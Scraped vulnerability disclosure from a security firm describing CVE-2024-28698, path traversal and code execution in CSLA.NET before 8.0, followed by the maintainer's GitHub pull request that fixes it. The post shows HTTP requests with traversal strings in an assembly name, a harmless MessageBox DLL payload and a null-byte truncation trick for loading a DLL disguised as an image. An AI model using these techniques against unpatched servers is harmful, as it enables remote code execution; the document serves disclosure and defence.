=== Content from www.intruder.io_d1ca3e97_20250110_202832.html ===
[![Intruder logo](https://cdn.prod.website-files.com/61dd9339d05701b1440b323d/64931cbdee18510b47f41730_Logo.svg)](/)What we do[Continuous vulnerability management](/continuous-vulnerability-management)[Attack surface management](/attack-surface-management)[REPORTING & COMPLIANCE](/effortless-reporting-compliance)How we do it[External vulnerability scanning](/external-vulnerability-scanner)[Internal vulnerability scanning](/internal-vulnerability-scanner)[Cloud vulnerability scanning](/cloud-vulnerability-scanning-for-aws-google-cloud-and-azure)[Web Application vulnerability scanning](/web-application-vulnerability-scanner)[API vulnerability scanning](/vulnerability-scanner/api-scanner)[REPORTING](/intelligent-issue-prioritisation)[Pricing](/pricing)Resources[DEVELOPER HUB](https://developers.intruder.io/docs?_gl=1*9iuogt*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NjU0NDQ1MS4xOS4wLjE2ODY1NDQ0NTEuNjAuMC4w)[Integration partners](/integration-partners)[HELP CENTRE](https://help.intruder.io/en/?_gl=1*9iuogt*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NjU0NDQ1MS4xOS4wLjE2ODY1NDQ0NTEuNjAuMC4w)[BLOG](/blog)[SUCCESS STORIES](/success-stories)[RESEARCH](/research)[WEBINARS](/webinars)[INTEL](https://intel.intruder.io/)Company[ABOUT US](/about-us)[CONTACT](/contact)[trust center](https://trust.intruder.io/)[BECOME A PARTNER](/partners/become-a-partner)[CAREERS](https://careers.intruder.io/?_gl=1*1nmt3bk*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NzI0OTQ3NS4yOC4xLjE2ODcyNDk0NzYuNTkuMC4w)[Login](https://accounts.intruder.io/login)[Try for free](https://portal.intruder.io/free_trial)[![Intruder logo](https://cdn.prod.website-files.com/61dd9339d05701b1440b323d/64931cbdee18510b47f41730_Logo.svg)](/)What we do[Continuous vulnerability management](/continuous-vulnerability-management)[Attack surface management](/attack-surface-management)[REPORTING & COMPLIANCE](/effortless-reporting-compliance)How we do it[External vulnerability scanning](/external-vulnerability-scanner)[Internal vulnerability scanning](/internal-vulnerability-scanner)[Cloud vulnerability scanning](/cloud-vulnerability-scanning-for-aws-google-cloud-and-azure)[Web Application vulnerability scanning](/web-application-vulnerability-scanner)[API vulnerability scanning](/vulnerability-scanner/api-scanner)[REPORTING](/intelligent-issue-prioritisation)[Pricing](/pricing)Resources[DEVELOPER HUB](https://developers.intruder.io/docs?_gl=1*9iuogt*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NjU0NDQ1MS4xOS4wLjE2ODY1NDQ0NTEuNjAuMC4w)[Integration partners](/integration-partners)[HELP CENTRE](https://help.intruder.io/en/?_gl=1*9iuogt*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NjU0NDQ1MS4xOS4wLjE2ODY1NDQ0NTEuNjAuMC4w)[BLOG](/blog)[SUCCESS STORIES](/success-stories)[RESEARCH](/research)[WEBINARS](/webinars)[INTEL](https://intel.intruder.io/)Company[ABOUT US](/about-us)[CONTACT](/contact)[trust center](https://trust.intruder.io/)[BECOME A PARTNER](/partners/become-a-partner)[CAREERS](https://careers.intruder.io/?_gl=1*1nmt3bk*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NzI0OTQ3NS4yOC4xLjE2ODcyNDk0NzYuNTkuMC4w)[Login](https://accounts.intruder.io/login)[Try for free](https://portal.intruder.io/free_trial)[Research](/research)
# Path Traversal and Code Execution in CSLA.NET (CVE-2024-28698)

![Sam Pizzey](https://cdn.prod.website-files.com/61dd9339d05701b1440b323d/660dd5c2edbcbc8902b9ad5a_6191a88a1c0e39463c2bf022_placeholder-image.svg)AuthorSam Pizzey√¢¬Ä¬¢Security ConsultantUpdatedTuesday, October 15, 2024|PublishedJuly 19, 2024|min read

CSLA.NET is a framework that helps structure business logic for .NET applications into re-usable objects and share those objects between systems. During a penetration test last year, we discovered an interesting path traversal vulnerability affecting applications using this framework. This vulnerability allows an attacker to execute code remotely if they are also able to upload a file to the server, as was the case in our penetration test. This was reported to the vendor, patched in version 8.0, and assigned [CVE-2024-28698](https://intel.intruder.io/cves/CVE-2024-28698).

If your application uses CSLA.NET before version 8.0 and allows users to upload files to your web server, you should update the framework as soon as possible. If you are unable to update, you should manually apply [this change](https://github.com/MarimerLLC/csla/pull/3552/commits/c2fb81c0418632a79b1ac988f6fa5741f1163114).

The rest of this post is a technical explanation of how the vulnerability works - and a bonus tip on using null bytes in .NET to truncate paths, like it's 1999. √∞¬ü¬ò¬é

## Discovery

While performing some web application testing for a client, I noticed some responses from `/api/DataPortal`, which contained an unusual format I wasn't familiar with:

```
HTTP/1.1 200 OK
Content-Type: application/octet-stream
[√¢¬Ä¬¶]

:Csla.Server.Hosts.DataPortalChannel.DataPortalResponse, /c [√¢¬Ä¬¶]Csla.Server.Hosts.DataPortalChannel.DataPortalErrorInfo, Csla, Version=7.0.0.0, Culture=neutral, PublicKeyToken=93be5fdc093e4c30ExceptionTypeName-System.IO.FileNotFoundExceptionMessageCould not load file or assembly 'C:\Users\Sam\Downloads\csla-7.0.3 (1)\csla-7.0.3\Samples\BlazorExample\BlazorExample\Server\bin\Debug\net7.0\BlazorExample.Shared\..\..\..\xxx.dll'. The system cannot find the file specified[√¢¬Ä¬¶]

```

√¢¬Ä¬ç*Note: This format contains non-printable characters between the fields, which are not reproduced here.*

It looked similar to BinaryFormatter, which is [unsafe to expose to users](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide), but a closer inspection revealed it was a different protocol.

Clues included in the request such as `Csla.Server.Hosts.DataPortalChannel` pointed to the [CSLA.NET](https://cslanet.com/) project - this endpoint was a CSLA [DataPortal](https://cslanet.com/5.4.2/html/class_csla_1_1_server_1_1_data_portal.html) which was being exposed to the application√¢¬Ä¬ôs front-end. The request was using CSLA.NET√¢¬Ä¬ôs custom `MobileFormatter` format.

I couldn√¢¬Ä¬ôt find any previous security research into this format, suggesting that it might be a likely area for finding vulnerabilities. When dealing with unknown protocols, combining fuzzing with Burp Intruder and some guesswork is a good first step for working out potential weak points. Specifically, I often find it worth focusing on fuzzing locations which look like boundaries between fields. When doing this here, the following error was generated:

**Request**

```
POST /api/DataPortal?operation=fetch HTTP/1.1
[√¢¬Ä¬¶]

7Csla.Server.Hosts.DataPortalChannel.CriteriaRequest, /c [√¢¬Ä¬¶]lBlazorExample.Shared.PersonList, BlazorExample.SharedXXX, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null

```

√¢¬Ä¬ç**Response**

```
HTTP/1.1 200 OK
Content-Type: application/octet-stream
[√¢¬Ä¬¶]

:Csla.Server.Hosts.DataPortalChannel.DataPortalResponse, /c [√¢¬Ä¬¶]Csla.Server.Hosts.DataPortalChannel.DataPortalErrorInfo, Csla, Version=7.0.0.0, Culture=neutral, PublicKeyToken=93be5fdc093e4c30ExceptionTypeName-System.IO.FileNotFoundExceptionMessageCould not load file or assembly 'C:\Users\Sam\Downloads\csla-7.0.3 (1)\csla-7.0.3\Samples\BlazorExample\BlazorExample\Server\bin\Debug\net7.0\BlazorExample.SharedXXX.dll'. The system cannot find the file specified[√¢¬Ä¬¶]

```

This error indicated that the application was trying to load a DLL file from a path containing a user-supplied string, and then failing because it doesn't exist. This is unusual and potentially insecure, as if the application loads a user-provided DLL file, an attacker can execute arbitrary code. Next, I tried a path traversal payload in the same location, to see if I could choose the directory the library was loaded from √¢¬Ä¬ì perhaps one that contains user-uploaded files.

**Request**

```
POST /api/DataPortal?operation=fetch HTTP/1.1
[√¢¬Ä¬¶]

7Csla.Server.Hosts.DataPortalChannel.CriteriaRequest, /c [√¢¬Ä¬¶]lBlazorExample.Shared.PersonList, BlazorExample.Shared\..\..\..\xxx, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null

```

**Response**

```
HTTP/1.1 200 OK
Content-Type: application/octet-stream
[√¢¬Ä¬¶]

:Csla.Server.Hosts.DataPortalChannel.DataPortalResponse, /c [√¢¬Ä¬¶]Csla.Server.Hosts.DataPortalChannel.DataPortalErrorInfo, Csla, Version=7.0.0.0, Culture=neutral, PublicKeyToken=93be5fdc093e4c30ExceptionTypeName-System.IO.FileNotFoundExceptionMessageCould not load file or assembly 'C:\Users\Sam\Downloads\csla-7.0.3 (1)\csla-7.0.3\Samples\BlazorExample\BlazorExample\Server\bin\Debug\net7.0\BlazorExample.Shared\..\..\..\xxx.dll'. The system cannot find the file specified[√¢¬Ä¬¶]

```

This also worked. So, if I was able to upload a DLL file to the server, for example by using file upload functionality provided by the application, I could load it into the web application using this bug and gain code execution, using a library which executes code as soon as it is loaded.

## The Details

Taking a look at the code for MobileFormatter, we can see that it can't usually be used with arbitrary objects - only basic .NET types, and classes that implement the `IMobileObject` interface. But, if we look at the code that performs this check, starting at `DeserializeAsDTO`, we see that [first it calls](https://github.com/MarimerLLC/csla/blob/91921c07ac5679f986147554b9f8ddf350bbe2c0/Source/Csla/Serialization/Mobile/MobileFormatter.cs#L256-L263) `GetTypeFromCache` with the user input as a parameter:

```
public object DeserializeAsDTO(List<SerializationInfo> deserialized)
{

	_deserializationReferences = new Dictionary<int, IMobileObject>();
	foreach (SerializationInfo info in deserialized)
	{
		var typeName = AssemblyNameTranslator.GetAssemblyQualifiedName(info.TypeName);
		Type type = GetTypeFromCache(typeName);

```

If this type isn't already cached, the `GetTypeFromCache` [function calls](https://github.com/MarimerLLC/csla/blob/91921c07ac5679f986147554b9f8ddf350bbe2c0/Source/Csla/Serialization/Mobile/MobileFormatter.cs#L196-L201) `MethodCaller.GetType` to get the type name:

```
private Type GetTypeFromCache(string typeName)
{
	Type result;
	if (!_typeCache.TryGetValue(typeName, out result))
	{
		result = Csla.Reflection.MethodCaller.GetType(typeName);

```

And [this function](https://github.com/MarimerLLC/csla/blob/845d4811e86f0951c5c725a665d11d1f71a28873/Source/Csla/Reflection/MethodCaller.cs#L251-L257) calls `LoadFromAssemblyPath`, a .NET standard library function which loads a .NET Assembly from a DLL. This function is used to load the assembly using the name provided by the user, but doesn√¢¬Ä¬ôt first validate the input is safe against path traversal:

```
string[] splitName = typeName.Split(',');

if (splitName.Length > 2)
{
	var asm = AssemblyLoadContext.Default.LoadFromAssemblyPath(AppContext.BaseDirectory + splitName[1].Trim() + ".dll");

	return asm.GetType(splitName[0].Trim());

```

The library should check here that the DLL resides within the application directory to prevent arbitrary DLLs from being loaded from the filesystem - the latest version of CSLA now does this.

## Practical Exploitation

Now that we can trick the framework into loading an assembly file of our choice, how can we use this to execute code?

A variety of methods exist for executing code when a DLL is loaded. In this case, I chose to use a native Windows DLL. Even when loading a native library, the .NET AssemblyLoader will still call `DllMain`, so we can keep our payload simple and avoid having to write a .NET Module Loader:

```
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
{
  switch(reason) {
    case DLL_PROCESS_ATTACH:
      MessageBox(NULL, L"Attacker controlled code displayed me", L"Hello from the DLL", MB_OK);
  }

  return TRUE;
}
```

There is another issue preventing realistic exploitation however - the [vulnerable code](https://github.com/MarimerLLC/csla/blob/845d4811e86f0951c5c725a665d11d1f71a28873/Source/Csla/Reflection/MethodCaller.cs#L255-L257) always appends the extension `.dll` to the end of the file that it tries to load, meaning that the file needs to be named `something.dll`. It is common to find a web application that will allow uploading images, text files and so on, but rare to find one that allows us to upload a DLL file.

However, `LoadFromAssemblyPath` will truncate the `assemblyFile` parameter when it reaches a null-byte, in a manner very similar to the null-byte Injection attacks in PHP of years gone by. By placing a null-byte after the filename in the serialised data, the '.dll' part will be ignored and we can load our assembly from a √Ç¬†file that the application assumes to be a safe file type, such as an image, as shown in snippet of a malicious request, when viewed in hex format so that the null-byte can be seen:

![](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/670e436243d63d270ccf93e9_669945fab6eb3e1df3f123c2_CSLA%25204.png)

The above techniques can be combined against the `BlazorExample` sample project from the CSLA repository. First, the malicious DLL is placed using the filename `xxx.jpg` into a directory a few levels up from the target application, to simulate file upload functionality as the `BlazorExample` application doesn√¢¬Ä¬ôt contain any.

Then, a malicious DataPortal request is made with this filename, using a null-byte at the end to truncate the path. The malicious payload in our library is executed and the dialog box is shown √¢¬Ä¬ì in this case over the top of the `BlazorExample` interface since this is a development environment, but in a real application this would be executed on the web server remotely:

![](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/670e436243d63d270ccf93e5_669943fced007620ad2d4b1c_CSLA5.png)

As a developer, it√¢¬Ä¬ôs important to be careful when writing applications that deal with user-supplied file paths √¢¬Ä¬ì the path must always be validated to ensure nobody can trick the server into using a location you didn√¢¬Ä¬ôt intend them to. Be careful of differences between operating systems! Some characters that are safe to include in a path on one may be unsafe on another. If unsure, the best bet is always to normalize the path after it has been built (most platforms have a built-in API for doing this), and then after it has been normalized to remove any √¢¬Ä¬òtraversal√¢¬Ä¬ô characters, check that the resulting path is where you expect it to be.

## Timeline

* 23 August 2023 - Initial disclosure to the CSLA project.
* 25 August 2023 - Response from CLSA & a request for more information.
* 25 August 2023 - Further information provided.
* 10 November 2023 - Follow-up from Intruder asking if there was any progress on a fix.
* 10 November 2023 - Potential fix committed by CSLA for review.
* 13 November 2023 - Fix merged into the CSLA `main` branch, available to developers.
* 3 April 2024 - CSLA 8.0 released, which contains the fix.
## Other research articles

[![Path Traversal and Code Execution in CSLA.NET (CVE-2024-28698)](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/6699343aa6692b92e8724f39_Exposure-Management-thumbnail.jpg)
### Path Traversal and Code Execution in CSLA.NET (CVE-2024-28698)

CSLA.NET is a framework that helps structure business logic for .NET applications into re-usable objects, and share those objects between systems. During a penetration test last year, we discovered an interesting path traversal vulnerability affecting applications using this framework. Read on for a technical explanation of how this vulnerability works.](/research/path-traversal-and-code-execution-in-csla-net-cve-2024-28698) [![Tricks for Reliable Split-Second DNS Rebinding in Chrome and Safari](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/656ef8e8cdd20af66afefc46_hack_ourselves_pt2-sq.webp)
### Tricks for Reliable Split-Second DNS Rebinding in Chrome and Safari

This is the second post in a two-part series on DNS rebinding. In this post, I introduce new techniques for achieving reliable, split-second DNS rebinding in Chrome, Edge, and Safari when IPv6 is available, as well as a technique for bypassing the local network restrictions applied to the fetch API in Chromium-based browsers.](/research/split-second-dns-rebinding-in-chrome-and-safari) [![We Hacked Ourselves With DNS Rebinding](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/656763af3d579c5e70fe628c_hack_ourselves_pt1-sq.webp)
### We Hacked Ourselves With DNS Rebinding

This post is the first in a two-part series on DNS rebinding in web browsers. In this post, I will talk about a bug we found in our own product which allowed us to retrieve low-privileged AWS credentials using DNS rebinding. In the next post, I will share new techniques to reliably achieve split-second DNS rebinding in Chrome, Edge, and Safari, as well as bypass Chrome's restrictions on requests to private networks.√¢¬Ä¬ç](/research/we-hacked-ourselves-with-dns-rebinding)
## Sign up for your free 14-day trial

[Start today](https://portal.intruder.io/free_trial)![7 days free trial](https://cdn.prod.website-files.com/61dd9339d05701b1440b323d/649161f655ece2717e597fec_cta-image-2.png)[![Intruder logo](https://cdn.prod.website-files.com/61dd9339d05701b1440b323d/64931cbdee18510b47f41730_Logo.svg)](/)WHAT WE DO[Vulnerability Management](https://www.intruder.io/continuous-vulnerability-management)[Attack Surface Management](/attack-surface-management)[Reporting and Compliance](/effortless-reporting-compliance)Comparisons[Intruder vs Acunetix](/acunetix-alternative)[Intruder vs Qualys](/qualys-alternative)[Intruder vs Rapid7](/rapid7-alternative)[Intruder vs Netsparker (Invicti)](/netsparker-alternative)[Intruder vs Detectify](/detectify-alternative)[Intruder vs Pentest-Tools.com](/pentest-tools-com-alternative)HOW WE DO IT[External Vulnerability Scanner](/external-vulnerability-scanner)[Internal Vulnerability Scanner](/internal-vulnerability-scanner)[Cloud Vulnerability Scanner](/cloud-vulnerability-scanning-for-aws-google-cloud-and-azure)[Web App Vulnerability Scanner](/web-application-vulnerability-scanner)[API√Ç¬†Vulnerability Scanner](/vulnerability-scanner/api-scanner)[Automated Penetration Testing](/automated-penetration-testing)COMPLIANCE[SOC 2](https://www.intruder.io/compliance/soc-2-vulnerability-management)[ISO 27001](https://www.intruder.io/compliance/iso-27001-vulnerability-management)[PCI DSS](https://www.intruder.io/compliance/pci-vulnerability-management)Resources[Developer Hub](https://developers.intruder.io/docs?_gl=1*45xq2q*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NTg5MzY1Mi4xMS4xLjE2ODU4OTQyNTAuNTUuMC4w)[Integration Partners](/integration-partners)[Help Centre](https://help.intruder.io/en/?_gl=1*45xq2q*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NTg5MzY1Mi4xMS4xLjE2ODU4OTQyNTAuNTUuMC4w)[Blog](/blog)[Success Stories](/success-stories)[Research](/research)[Webinars](/webinars)[Intel](https://intel.intruder.io/)Company[About Us](/about-us)[Contact](/contact)[Become a Partner](/partners/become-a-partner)[Careers (We're hiring!)](https://careers.intruder.io/?_gl=1*v6z0gl*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NTg5MzY1Mi4xMS4xLjE2ODU4OTQyNTAuNTUuMC4w)[![Protected by Intruder badge](https://storage.googleapis.com/intruder-assets/20230609/intruder-badge.svg)](https://help.intruder.io/en/articles/4086526-intruder-badges)Contact us√Ç¬© 2024 Intruder Systems Ltd.[Privacy Policy](/privacy)[Terms of Service](/legal/terms)[Status](https://status.intruder.io/?_gl=1*v6z0gl*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NTg5MzY1Mi4xMS4xLjE2ODU4OTQyNTAuNTUuMC4w)[Security](/security)[Trust center](https://trust.intruder.io/)[Sitemap](/sitemap)Registered in England, VAT Number GB228985360. Intruder is a trading name of Intruder Systems Ltd, Company Registration Number 09529593.

![](https://dc.ads.linkedin.com/collect/?pid=365706&fmt=gif)

[![ClickCease](https://monitor.clickcease.com)](https://www.clickcease.com)



=== Content from github.com_56562d3f_20250110_202827.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMarimerLLC%2Fcsla%2Fpull%2F3552)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMarimerLLC%2Fcsla%2Fpull%2F3552)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=MarimerLLC%2Fcsla)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[MarimerLLC](/MarimerLLC)
/
**[csla](/MarimerLLC/csla)**
Public

* [Notifications](/login?return_to=%2FMarimerLLC%2Fcsla) You must be signed in to change notification settings
* [Fork
  406](/login?return_to=%2FMarimerLLC%2Fcsla)
* [Star
   1.3k](/login?return_to=%2FMarimerLLC%2Fcsla)

* [Code](/MarimerLLC/csla)
* [Issues
  36](/MarimerLLC/csla/issues)
* [Pull requests
  7](/MarimerLLC/csla/pulls)
* [Discussions](/MarimerLLC/csla/discussions)
* [Actions](/MarimerLLC/csla/actions)
* [Projects
  4](/MarimerLLC/csla/projects)
* [Security](/MarimerLLC/csla/security)
* [Insights](/MarimerLLC/csla/pulse)

Additional navigation options

* [Code](/MarimerLLC/csla)
* [Issues](/MarimerLLC/csla/issues)
* [Pull requests](/MarimerLLC/csla/pulls)
* [Discussions](/MarimerLLC/csla/discussions)
* [Actions](/MarimerLLC/csla/actions)
* [Projects](/MarimerLLC/csla/projects)
* [Security](/MarimerLLC/csla/security)
* [Insights](/MarimerLLC/csla/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FMarimerLLC%2Fcsla%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FMarimerLLC%2Fcsla%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Prevent use of .. or : in file path #3552

 Merged

[rockfordlhotka](/rockfordlhotka)
merged 1 commit into
[MarimerLLC:main](/MarimerLLC/csla/tree/main "MarimerLLC/csla:main")
from
[rockfordlhotka:3551-assemblyload](/rockfordlhotka/csla/tree/3551-assemblyload "rockfordlhotka/csla:3551-assemblyload")

Nov 16, 2023

 Merged

# [Prevent use of .. or : in file path](#top) #3552

[rockfordlhotka](/rockfordlhotka)
merged 1 commit into
[MarimerLLC:main](/MarimerLLC/csla/tree/main "MarimerLLC/csla:main")
from
[rockfordlhotka:3551-assemblyload](/rockfordlhotka/csla/tree/3551-assemblyload "rockfordlhotka/csla:3551-assemblyload")

Nov 16, 2023

[Conversation
6](/MarimerLLC/csla/pull/3552)
[Commits
1](/MarimerLLC/csla/pull/3552/commits)
[Checks
1](/MarimerLLC/csla/pull/3552/checks)
[Files changed](/MarimerLLC/csla/pull/3552/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![rockfordlhotka](https://avatars.githubusercontent.com/u/2333134?s=60&v=4)](/rockfordlhotka)

Copy link

Member

### @rockfordlhotka **[rockfordlhotka](/rockfordlhotka)** commented [Nov 10, 2023](#issue-1988343400)

Closes [#3551](https://github.com/MarimerLLC/csla/issues/3551)

Sorry, something went wrong.

All reactions

[![@rockfordlhotka](https://avatars.githubusercontent.com/u/2333134?s=40&v=4)](/rockfordlhotka)

`[MarimerLLC#3551](https://github.com/MarimerLLC/csla/issues/3551) [Prevent use of .. or : in file path](/MarimerLLC/csla/pull/3552/commits/c2fb81c0418632a79b1ac988f6fa5741f1163114 "#3551 Prevent use of .. or : in file path")`

`[c2fb81c](/MarimerLLC/csla/pull/3552/commits/c2fb81c0418632a79b1ac988f6fa5741f1163114)`

 [![@rockfordlhotka](https://avatars.githubusercontent.com/u/2333134?s=40&u=1c7ddeb63f60a157d4fd4d12702af15f4da9eb5a&v=4)](/rockfordlhotka)
[rockfordlhotka](/rockfordlhotka)
requested a review
from [BaHXeLiSiHg](/BaHXeLiSiHg)
[November 10, 2023 20:29](#event-10929360084)

[![@rockfordlhotka](https://avatars.githubusercontent.com/u/2333134?s=80&u=1c7ddeb63f60a157d4fd4d12702af15f4da9eb5a&v=4)](/rockfordlhotka)

Copy link

Member

Author

### **[rockfordlhotka](/rockfordlhotka)** commented [Nov 11, 2023](#issuecomment-1806613075)

| [@BaHXeLiSiHg](https://github.com/BaHXeLiSiHg) fyi, I'm requesting your review here because the code being affected exists due to a PR we worked on quite some time ago, to enable loading/unloading assemblies in memory. The result is a potential security issue that's been uncovered, and this is an attempt to resolve that by preventing loading assemblies from outside the app's `bin` directory tree. |
| --- |

All reactions

Sorry, something went wrong.

[![BaHXeLiSiHg](https://avatars.githubusercontent.com/u/15612158?s=60&v=4)](/BaHXeLiSiHg)

**[BaHXeLiSiHg](/BaHXeLiSiHg)**
reviewed
[Nov 13, 2023](#pullrequestreview-1727542263)

 [View reviewed changes](/MarimerLLC/csla/pull/3552/files/c2fb81c0418632a79b1ac988f6fa5741f1163114)

Copy link

Contributor

### @BaHXeLiSiHg **[BaHXeLiSiHg](/BaHXeLiSiHg)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Yep, I'm okay with that.

Sorry, something went wrong.

 üëç
1
 rockfordlhotka reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

 Hide details
View details

[![@rockfordlhotka](https://avatars.githubusercontent.com/u/2333134?s=40&u=1c7ddeb63f60a157d4fd4d12702af15f4da9eb5a&v=4)](/rockfordlhotka)
[rockfordlhotka](/rockfordlhotka)
merged commit [`2c32a57`](/MarimerLLC/csla/commit/2c32a5748a0a4bb0159285dfad61d4050e890080)
into
MarimerLLC:main

[Nov 16, 2023](https://github.com/MarimerLLC/csla/pull/3552#event-10984425287)
1 check passed

 [![@rockfordlhotka](https://avatars.githubusercontent.com/u/2333134?s=40&u=1c7ddeb63f60a157d4fd4d12702af15f4da9eb5a&v=4)](/rockfordlhotka)
[rockfordlhotka](/rockfordlhotka)
deleted the
3551-assemblyload

branch
[November 16, 2023 18:19](#event-10984426461)

[![@sampizzey](https://avatars.githubusercontent.com/u/119413670?s=80&v=4)](/sampizzey)

Copy link

### **[sampizzey](/sampizzey)** commented [Mar 6, 2024](#issuecomment-1980454867)

| Hi folks, Do you know if this issue was ever assigned a CVE identifier, and if not, could one be assigned (probably most easily using Githubs system for it, as the project has the module enabled already?) |
| --- |

All reactions

Sorry, something went wrong.

[![@rockfordlhotka](https://avatars.githubusercontent.com/u/2333134?s=80&u=1c7ddeb63f60a157d4fd4d12702af15f4da9eb5a&v=4)](/rockfordlhotka)

Copy link

Member

Author

### **[rockfordlhotka](/rockfordlhotka)** commented [Mar 6, 2024](#issuecomment-1981816607)

| I've never explored that concept [@sampizzey](https://github.com/sampizzey), would this be in GH or NuGet? |
| --- |

All reactions

Sorry, something went wrong.

[![@ajohnstone-ks](https://avatars.githubusercontent.com/u/22680122?s=80&v=4)](/ajohnstone-ks)

Copy link

### **[ajohnstone-ks](/ajohnstone-ks)** commented [Aug 5, 2024](#issuecomment-2268884397)

| [@rockfordlhotka](https://github.com/rockfordlhotka) I just got an email b/c one of my repo's is apparently using a version of Csla which is vunerable.  <https://cve.mitre.org/cgi-bin/cvename.cgi?name=2024-28698>  Was this fix ever backported? It seems like it should be given the effort required to move to Csla 6+. |
| --- |

All reactions

Sorry, something went wrong.

[![@rockfordlhotka](https://avatars.githubusercontent.com/u/2333134?s=80&u=1c7ddeb63f60a157d4fd4d12702af15f4da9eb5a&v=4)](/rockfordlhotka)

Copy link

Member

Author

### **[rockfordlhotka](/rockfordlhotka)** commented [Aug 6, 2024](#issuecomment-2270185281)

